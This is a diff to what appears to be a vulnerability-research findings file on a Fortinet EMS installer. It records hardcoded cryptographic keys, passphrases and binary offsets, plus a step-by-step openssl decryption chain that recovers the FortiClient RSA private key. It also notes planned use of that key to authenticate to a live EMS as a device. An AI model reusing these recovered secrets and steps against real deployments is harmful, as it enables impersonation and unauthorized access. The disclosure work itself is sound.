@@ -1110,15 +1110,43 @@ EMS_F16_SHARED_FORTICLIENT_CERT = {
     },
 
     "private_key_recovery": {
-        "key_format":   "RSA PRIVATE KEY, Proc-Type: 4,ENCRYPTED, DEK-Info: AES-256-CBC,F4DD69DDD1982F6FDD0D75097603C628",
-        "key_location": "ecsocksrv.exe goEMSCommon.defaultKey global, RVA=0x01DD33A0, file=0x019D19A0, len=1796",
-        "enc_sym":      "goEMSCommon/common.defaultCertPassEnc (RVA=0x1DAF900, len=40, file=0x019ADF00)",
-        "key_sym":      "goEMSCommon/common.defaultCertPassKey (RVA=0x1DAF940, len=40, file=0x019ADF40)",
-        "cipher":       "XOR: passphrase = defaultCertPassEnc XOR defaultCertPassKey",
-        "passphrase":   b'j41z"{S8T*]{}<:0+yx N+,@i/23\'$$\'&138>73n'.hex(),
-        "passphrase_ascii": 'j41z"{S8T*]{}<:0+yx N+,@i/23\'$$\'&138>73n',
-        "openssl_verify": "openssl rsa -in defaultKey.pem -passin pass:<passphrase> -noout -text -- exit 0",
-        "decrypted_key_file": "/tmp/ems_default_ca.key",
+        "storage_a": {
+            "label":        "defaultKey global (main storage, all worker binaries)",
+            "key_format":   "RSA PRIVATE KEY, Proc-Type: 4,ENCRYPTED, DEK-Info: AES-256-CBC,F4DD69DDD1982F6FDD0D75097603C628",
+            "key_location": "ecsocksrv.exe goEMSCommon.defaultKey global, RVA=0x01DD33A0, file=0x019D19A0, len=1796",
+            "enc_sym":      "goEMSCommon/common.defaultCertPassEnc (RVA=0x1DAF900, len=40, file=0x019ADF00)",
+            "key_sym":      "goEMSCommon/common.defaultCertPassKey (RVA=0x1DAF940, len=40, file=0x019ADF40)",
+            "layer_1":      "XOR: passphrase = defaultCertPassEnc XOR defaultCertPassKey",
+            "passphrase_hex": "6a34317a227b5338542a5d7b7d3c3a302b7978204e2b2c40692f323327242427263133383e37336e",
+            "passphrase_ascii": 'j41z"{S8T*]{}<:0+yx N+,@i/23\'$$\'&138>73n',
+            "openssl_cmd":  "openssl rsa -in defaultKey.pem -passin pass:<passphrase> -noout -text (exit 0)",
+            "decrypted_key_file": "/tmp/ems_default_ca.key",
+        },
+        "storage_b": {
+            "label":        "serverKeyEnc global (manager package, three-layer encryption chain)",
+            "key_format":   "RSA PRIVATE KEY -- same 2048-bit key as storage_a, different wrapping",
+            "outer_blob":   "manager.serverKeyEnc COFF: RVA=0x01A19AF0, file=0x01A180F0, Go string header; blob data at file=0x019D12C0, len=1744 bytes",
+            "layer_1_outer": "AES-128-CBC, key=manager.k1 (16 bytes: f89f5a4965e67e5d32b7264e77a9825f), IV=zeros -- decrypts to DES-EDE3-CBC PEM",
+            "passphrase_blob": "manager.serverKeyPwd COFF: RVA=0x01A19B10, file=0x01A18110, len=32; data at file=0x019ACEC0",
+            "passphrase_enc": "serverKeyPwd (32 bytes) is itself AES-128-CBC encrypted: key=k1, IV=zeros",
+            "passphrase_dec": "certpass@fn.fds.cert (20 bytes, PKCS7 padded to 32 with 0x0c * 12)",
+            "layer_2_inner":  "DES-EDE3-CBC, IV=93633AE9E7AE224E, passphrase=certpass@fn.fds.cert (EVP_BytesToKey MD5)",
+            "layer_2_result": "RSA PRIVATE KEY DER -- modulus matches defaultKey (FABCF1C870453A1FD563C4B38D86505C07F387...)",
+            "decrypted_key_file": "/tmp/ems_grpc_server_decrypted.key",
+            "decryption_chain": [
+                "step1: outer_pt = AES128_CBC(key=k1, IV=0x00*16, ct=serverKeyEnc) -> DES-EDE3-CBC PEM",
+                "step2: passphrase_pt = AES128_CBC(key=k1, IV=0x00*16, ct=serverKeyPwd) = 'certpass@fn.fds.cert'",
+                "step3: rsa_key = openssl rsa -passin pass:certpass@fn.fds.cert -in <step1_pem>",
+            ],
+        },
+        "k1_symbol": {
+            "name":     "manager.k1",
+            "COFF":     "COFF: RVA=0x01A19AB0, file=0x01A180B0, section=3 (.data)",
+            "hdr_file": "0x1A180B0 (Go string header: ptr=0x1DAD750, len=16)",
+            "data_file": "0x19ABD50",
+            "value_hex": "f89f5a4965e67e5d32b7264e77a9825f",
+            "role":     "AES-128 key; IV always zeros; used by decryptAES128CBC to protect serverKeyEnc and serverKeyPwd",
+        },
     },
 
     "attack": (
@@ -1200,6 +1228,87 @@ EMS_F17_SHARED_APACHE_TLS_KEY = {
 
 
 # ---------------------------------------------------------
+# EMS-F18: Hardcoded AES-128 key k1 enables three-layer server key decryption
+# ---------------------------------------------------------
+EMS_F18_K1_HARDCODED_AES_KEY = {
+    "id":       "EMS-F18",
+    "title":    "Hardcoded AES-128 key manager.k1 breaks three-layer encryption protecting FortiClient gRPC server private key",
+    "severity": "CRITICAL",
+    "cvss":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "cvss_score": 9.1,
+    "cwe":      "CWE-321 (Use of Hard-coded Cryptographic Key)",
+    "status":   "CONFIRMED -- all three layers broken; RSA private key fully recovered from installer binary",
+
+    "k1_key": {
+        "symbol":     "fortinet.com/goEMSCommon/common/manager.k1",
+        "COFF_RVA":   "0x01A19AB0",
+        "data_file":  "ecsocksrv.exe @ 0x19ABD50, len=16",
+        "value_hex":  "f89f5a4965e67e5d32b7264e77a9825f",
+        "function":   "common/manager.decryptAES128CBC (VA=0xECB200, file=0xACA800)",
+        "usage":      "k1 is loaded directly in decryptAES128CBC before any cipher operation; IV is always zeros (16 null bytes zero-initialized at runtime)",
+    },
+
+    "decryption_chain": {
+        "serverKeyPwd_enc": {
+            "symbol":   "manager.serverKeyPwd",
+            "COFF_RVA": "0x01A19B10",
+            "data_file": "0x19ACEC0, len=32",
+            "raw_hex":   "beda706dbf24331af1f0c9ee4af27db0c3ee623d8909b90b6e58bb9d24d38151",
+            "decrypt":   "AES-128-CBC(key=k1, IV=zeros) -> 'certpass@fn.fds.cert' + PKCS7(0x0c * 12)",
+            "passphrase": "certpass@fn.fds.cert",
+        },
+        "serverKeyEnc_outer": {
+            "symbol":   "manager.serverKeyEnc",
+            "COFF_RVA": "0x01A19AF0",
+            "data_file": "0x19D12C0, len=1744",
+            "decrypt":   "AES-128-CBC(key=k1, IV=zeros) -> RSA PRIVATE KEY PEM, DEK-Info: DES-EDE3-CBC,93633AE9E7AE224E",
+        },
+        "serverKeyEnc_inner": {
+            "cipher":    "DES-EDE3-CBC",
+            "iv_hex":    "93633AE9E7AE224E",
+            "passphrase": "certpass@fn.fds.cert",
+            "kdf":       "OpenSSL EVP_BytesToKey (MD5, 1 iteration, salt=DEK-Info IV[:8])",
+            "result":    "RSA PRIVATE KEY (2048-bit) -- same key as EMS-F16 defaultKey",
+        },
+        "serverCrtEnc": {
+            "symbol":   "manager.serverCrtEnc",
+            "COFF_RVA": "0x01A19AD0",
+            "data_file": "0x19DEE00, len=4288",
+            "decrypt":   "AES-128-CBC(key=k1, IV=zeros) -> openssl x509 -text verbose output of defaultCert",
+            "cert_subject": "CN=FortiClient, O=Fortinet, OU=FortiClient",
+            "cert_serial":  "4267478 (0x411dd6)",
+            "cert_valid":   "2017-04-21 to 2038-01-19",
+            "modulus_match": "FABCF1C870453A1FD563C4B38D86505C07F387... -- same as EMS-F16 defaultCert",
+        },
+    },
+
+    "function_map": {
+        "common/manager.decryptAES128CBC": "VA=0xECB200; loads k1, zeros IV, CBC decrypts input slice",
+        "common/manager.unlockKey":        "VA=0xECB540; calls decryptAES128CBC(serverKeyPwd) then processes result",
+        "common/manager.deriveKey":        "VA=0xEB8160; goroutine-spawns deriveKey.func1 for DAS channel key derivation (separate path, PBKDF2 16384 iter)",
+        "common/manager.gcm":              "VA=0xEB8320; AES-GCM encrypt/decrypt for DAS channel (separate path from k1/CBC)",
+        "common/manager.Encrypt":          "VA=0xEB85C0; wraps gcm for DAS encryption",
+        "common/manager.Decrypt":          "VA=0xEB89E0; wraps gcm for DAS decryption",
+    },
+
+    "attack": (
+        "k1 is embedded in plaintext in ecsocksrv.exe (recoverable with single COFF symbol lookup). "
+        "AES-128-CBC(k1, IV=zeros) on serverKeyPwd yields 'certpass@fn.fds.cert'. "
+        "AES-128-CBC(k1, IV=zeros) on serverKeyEnc yields a DES-EDE3-CBC PEM file. "
+        "openssl rsa -passin pass:certpass@fn.fds.cert decrypts the PEM to the plaintext RSA-2048 private key. "
+        "The recovered key is the FortiClient identity private key (same as EMS-F16 defaultKey). "
+        "Combined with the shipped defaultCert, attacker authenticates any machine to any EMS as a FortiClient device."
+    ),
+
+    "recovered_keys": {
+        "decrypted_serverKeyEnc": "/tmp/ems_grpc_server_decrypted.key",
+        "decrypted_outer_pem":    "/tmp/ems_grpc_server.key.pem",
+        "cert_text":              "/tmp/ems_grpc_server.crt.txt",
+    },
+}
+
+
+# ---------------------------------------------------------
 # EMS-F12: defusedxml 0.5.0 -- EMS-F3 XXE partially mitigated
 # ---------------------------------------------------------
 EMS_F12_DEFUSEDXML_VERSION = {
@@ -1234,9 +1343,9 @@ EMS_F12_DEFUSEDXML_VERSION = {
 PENDING = [
     # Crypto / key material
     "EMS-F17: Confirm ca.crt (Apache EMS CA) is shipped vs per-installation; if shipped, recover or confirm CA private key location",
-    "EMS-F16/F17: Chain -- use decrypted defaultKey + defaultCert to authenticate to live EMS as FortiClient device",
-    "EMS-F5: --keypass in goEMSCommon/common.getKeyPass -- different from defaultCertPassKey; is there a SECOND encrypted key for port 8013 TLS?",
-    "defaultKey modulus vs ca.crt -- confirmed no match; defaultKey matches defaultCert (FortiClient end-entity cert, not CA)",
+    "EMS-F16/F17/F18: Chain live test -- use decrypted defaultKey + defaultCert to authenticate to live EMS as FortiClient device",
+    "EMS-F5: --keypass in goEMSCommon/common.getKeyPass -- now confirmed separate from k1/defaultCertPassKey; find port 8013 actual TLS server cert (not FortiClient client cert)",
+    "EMS-F18: Determine if deriveKey/gcm PBKDF2 path (16384 iter, dasSalt) is used for any external-facing surface (DAS channel at 127.0.0.1:65432 is localhost-only)",
 
     # Protocol / binary RE
     "EMS-F15: Determine runSrvCmd semantics -- what service commands are valid and what they execute",
